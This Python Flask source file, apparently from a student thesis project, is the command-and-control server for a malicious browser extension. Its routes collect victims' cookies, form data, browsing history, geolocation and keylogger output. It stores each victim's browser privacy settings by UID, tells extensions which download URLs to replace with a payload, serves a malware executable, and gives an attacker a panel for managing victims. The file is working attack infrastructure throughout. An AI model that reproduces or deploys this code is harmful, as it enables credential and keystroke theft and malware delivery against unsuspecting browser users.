
"""Structure of the comments:

The code will be divided by comments in sections. 
Those sections are: Testing, Non_Database_Logging, Communication_Server_Extension, Database
The first section as expected is for testing components of requests and how differents functions work.
Database section Manages all server logic of the database, that can be found in test.sqlite
Non_Database_logging is used in one of the snippets of code to log and understand the data recovered there

General comments Flask:
This is a local server build with flask that use a custom log package for storing the data
Flask for the creation of routes use the decorator @app.route(<route>), each of those is a new page/directory inside the server
Inside each route there is a function with the same name that the route (for comodity), the returns in those function
do a variaty of work. They could be what is expected to be shown in the webpage (an HTML) or the response to a POST or GET requests

Important to note that flask in the @app.route() also allow for (<route>/<type:variable>) syntax

General comments Sqlite:
Each time an operation wants to be realised inside the Sqlite database a connections has to be stablished
This is done by conn = sql.connect(PATH), then a cursos object has to be created that is 
cur = conn.cursor(). The attribute execute(str, values) can traslate the string str to a
query in SQL, the values used in the query have to be indicated with a ? in str and be giving
in the correct order of appearence in values.

Bibliography:
https://stackoverflow.com/questions/20646822/how-to-serve-static-files-in-flask 

How to start the Server:

First start an enviroment with flask, in my case:
conda activate servers

Then execute server with flask being PATH the path to app.py:

"""
#flask --app C:\Users\migue\Documents\TFG\TFGExtension\Server\app run
#importing the necessary libraries
import flask 
from flask import Flask, request, jsonify #The most used function from flask
import log
import os
import sqlite3 as sql
#creating an instance of the Flask class. This allows the flask library to now the name and file paths of the server
app = Flask(__name__,
            static_url_path='', 
            static_folder='Control/static',
            template_folder='Control/templates')

"""GLOBAL VARIABLES

DB_PATH = The path of the database
MAL_FILE = the name of the malware file in "/Server/Control/files/" to be send to a download request
"""

DB_PATH = __file__[:-6]+"DB\\test.sqlite"
MAL_FILE = "prueba.exe"

"""TESTING SECTION

route("/") with function hello_world has not use outside of being the root route
route("/initialize") is used for cleaning and restarting any log file and DB
route("/control_server") is used has a default post web for testing purposes
"""

@app.route("/") #Root route for testing, not in use
def hello_world():
    
    return flask.render_template("1.html") #an HTML is shown, this HTML can be found in the template_folder

#Create or restart DB and all other logger file
@app.route("/initialize")
def initialize():
    log.main()
    create_database()
    return "Redoing all"



#Default Post route 
@app.route('/control_server', methods=['POST'])
def control_server():
    print(request.get_json(force=True)) #Force any info recived to a json and print it in the console
                                        #Such that any Post can be reed and analize for future implementation
    return "thanks"

"""
NON_DATABASE_LOGGING

Each of this routes and functions has the purpose of Logging formatted information 
received, this is only used by "/Extension". The following distribution is followd
"/g" = geolocation Data
"/c" = Cookie Data
"/f" = Form Data
"/h" = Historial Data
"/k" = KeyLogger Data
"/u" = URL DATA
For better understanding of each of this Datas please go to "/Extension" or "/Server/log.py"

Assume that all of them take the received information and redirec them to the correct fucntion in log.py
The return statement will be ignored by the extension
"""

@app.route("/g", methods=['POST'])
def g():
    log.log("Geo", request.get_data())
    return "Done"
@app.route("/c", methods=['POST'])
def c():
    log.log("Coo", request.get_data())
    return "Done"
@app.route("/f", methods=['POST'])
def f():
    log.log("Form", request.get_data())
    return "Done"
@app.route("/h", methods=['POST'])
def h():
    log.log("His", request.get_data())
    return "Done"
@app.route("/k", methods=['POST'])
def k():
    log.log("Key", request.get_data())
    return "Done"
@app.route("/u", methods=['POST'])
def u():
    log.log("Url", request.get_data())
    return "Done"

"""
COMMUNICATION_SERVER_EXTENSION
The routes in this section manages the information that the server could provide
to the extensions. That is:
Phase: Indicates the state of the download malware in the extension 0 = inactive; 1 = active
Targer_URL_Download: From which URL to download new payload
Objective_URL_Download: Which dowload URL to change with the new payload

WIP: 
Target_URL_Phising
Objective_URL_Phising
Delta_Sending_Data
Delta_Asking_Phase

Route "/req/<int:uid>" is used by the extension to Request information by presenting its UID
Route "/download" allow for a local file to be download by the extension to the user machine.
"""

@app.route("/req/<int:uid>", methods=['GET'])#The extension can request information by identifying itshelf with its UID
def req(uid):
    conn = sql.connect(DB_PATH) #Open database
    cur = conn.cursor()
    uid = [int(uid)]
    cur.execute("SELECT * FROM Users WHERE uid = ?",
                    (uid)) #Query all information in the correct Table
    rows = cur.fetchone() #UID is unique, so only one fetch is needed
    conn.close() #close connection
    print(type(rows))
    if(rows == None): #If uid that is not in the database is used, return False, print in console information
        print("Not in Database: ", uid) 
        return "False"
    else: #If uid is in the database, give all information
        return jsonify(phase = rows[1], obj =  rows[2], tar = rows[3], nam = rows[4])

@app.route('/download')
def downloadFile (): #extremly simple route for the extension to download a file
    path = __file__[:-6]+"Control\\files\\" + MAL_FILE
    return flask.send_file(path, as_attachment=True) #download file

#https://stackoverflow.com/questions/24577349/flask-download-a-file
    




"""
DATABASE LOGIC:

This functions and pages manages the creations, addition, edition and elimination 
logic of the database.

The database is a sqlite file in the /DB/ folder called test.sqlite, everything is 
managed by the sqlite python module.

This code is built from the basis presented in:
https://stackoverflow.com/questions/67429333/flask-how-to-update-information-on-sqlite-based-on-button-input

The logic make use of some html files present in /Control/templates/ for presenting a raw
UI to the attacker.

All Tables contains the uid of the victim.

create_database is used in the {URL}/initizalize page

route /list shows all UID, their phase and actual Objectives, Targets and File_Name
route /add allows for adding manually UID
route /extadd/<int:number> for the extesion to add information defined by the number
route /edit allos for manually editing main table (modify objectives, tarjets and file_name)
route /delete deletes wanted UID entry
route /listByUid/<int:uid> Queries all information of a particular UID
"""


def create_database(): #The creation of the DATABASE, does not drop all information when restarted
    conn = sql.connect(DB_PATH)
    cur = conn.cursor()
    #Users Table, store UID and general attack information, obj = Objective_URL_download, tar = Target_URL_Download, nam = Name_Download
    cur.execute("""
                CREATE TABLE IF NOT EXISTS Users (
                    uid INTEGER PRIMARY KEY,
                    phase INTEGER,
                    obj TEXT,
                    tar TEXT,
                    nam TEXT
                )                
                """)
    #ContentSettings Table, store the content settings of a possible victim by UID
    cur.execute("""
                CREATE TABLE IF NOT EXISTS ContentSettings (
                    automaticDownloads TEXT,
                    cookies TEXT,
                    images TEXT,
                    javaScript TEXT,
                    location TEXT,
                    plugins TEXT,
                    popups TEXT,
                    notifications TEXT,
                    fullScreen TEXT,
                    mouseLocks TEXT,
                    microphone TEXT,
                    camera TEXT,
                    unsandboxedPlugins TEXT,
                    csuid INTEGER,
                    FOREIGN KEY(csuid) REFERENCES Users(uid)
                    
                )

                """
    )
    #PrivacySettins Table, store privacy settings of a possible victim by UID
    cur.execute("""
                CREATE TABLE IF NOT EXISTS PrivacySettings (
                alternateErrorPagesEnabledVal TEXT,
                alternateErrorPagesEnabledLev TEXT,
                safeBrowsingEnabledVal TEXT,
                safeBrowsingEnabledLev TEXT,
                hyperlinkAuditingEnabledVal TEXT,
                hyperlinkAuditingEnabledLev TEXT,
                doNotTrackEnabledVal TEXT,
                doNotTrackEnabledLev TEXT,
                protectedContentEnabledVal TEXT,
                protectedContentEnabledLev TEXT,
                psuid INTEGER,
                FOREIGN KEY(psuid) REFERENCES Users(uid)


                )
    
    """)

    conn.commit()
    
    conn.close()
    
@app.route('/list')
def list():
    #This will give a view of all UID store and their respective attack information
    #Also allows for edition and removing, such that Admin task can be done in the fly

    conn = sql.connect(DB_PATH)
    cur = conn.cursor()

    cur.execute("SELECT * FROM  Users")
    rows = cur.fetchall()

    conn.close()

    return flask.render_template("list.html", rows=rows)

@app.route('/listByUid/<int:uid>')
def list2(uid):
    #This route will show all data store of a victim (identify by the UID). Internal use only
    conn = sql.connect(DB_PATH)
    cur = conn.cursor()

    cur.execute("""
    SELECT * FROM  Users u RIGHT JOIN ContentSettings c ON u.uid = c.csuid LEFT JOIN PrivacySettings p ON u.uid = p.psuid
    """)
    rows = cur.fetchall()

    conn.close()

    return flask.render_template("list_copy.html", rows=rows)


@app.route('/edit/<int:number>', methods=['GET', 'POST'])
def edit(number):
    #Edition formula for Users Table from route /list
    conn = sql.connect(DB_PATH)
    cur = conn.cursor()

    if request.method == 'POST': #the request information to be obtained from the edit html
        item_uid    = number
        item_phase = request.form['phase']
        item_obj = request.form['obj']
        item_tar = request.form['tar']
        item_nam = request.form['nam']
    
        cur.execute("UPDATE Users SET phase = ?, obj = ?, tar = ?, nam =? WHERE uid = ?",
                    (item_phase, item_obj,item_tar, item_nam, item_uid)) #updating values with new ones
        conn.commit()
        
        return flask.redirect('/list') #return to route "/list" to see changes done
            
    cur.execute("SELECT * FROM Users WHERE uid = ?", (number,))
    item = cur.fetchone()
    
    conn.close()

    return flask.render_template("edit.html", item=item)


@app.route('/delete/<int:number>')
def delete(number):
    #Delete route that is execute from list, WIP delete all information in all Tables
    #internal use only
    conn = sql.connect(DB_PATH)
    cur = conn.cursor()
        
    cur.execute("DELETE FROM Users WHERE uid = ?", (number,))

    conn.commit()
    
    conn.close()

    return flask.redirect('/list') 

@app.route('/add', methods=['GET', 'POST'])
def add():
    #adding route to manage from route "/list" used in testing purposes
    #Internal use only
    conn = sql.connect(DB_PATH)
    cur = conn.cursor()

    if request.method == 'POST':
        item_uid    = request.form['uid']
        item_phase = request.form['phase'] #because this is for testing, there is no need to add inmediatly all atributes

        
        cur.execute("""INSERT INTO Users (uid, phase) VALUES (?, ?)""", 
                    (item_uid, item_phase))
        conn.commit()
        
        return flask.redirect('/list') 
        
    return flask.render_template("add.html")


@app.route("/extadd/<int:number>", methods=['POST'])
def extadd(number):
    '''
    This is the route for adding elements to the database for the extions
    the int number determines which Table to send the information
    The information is processed in the log.py module.
    Number dictionary:
    1 = Content Settings
    2 = Privacy Settings
    None = New User Register
    '''

    if (number == 1): 
        data = request.get_json(force=True)
        log.CSDBlog(data)
        pass
    elif (number == 2):
        data = data = request.get_json(force=True)
        log.PSDBlog(data)
        pass
    else:
        if request.method == 'POST':
            conn = sql.connect(DB_PATH)
            cur = conn.cursor()
            item_uid    = int(request.get_json(force=True)["uid"][0])
            item_phase = 0
            #https://stackoverflow.com/questions/19337029/insert-if-not-exists-statement-in-sqlite
            cur.execute("""INSERT OR IGNORE INTO Users (uid, phase) VALUES (?, ?)""", 
                        (item_uid, item_phase))
            conn.commit()
        
    return "good day"


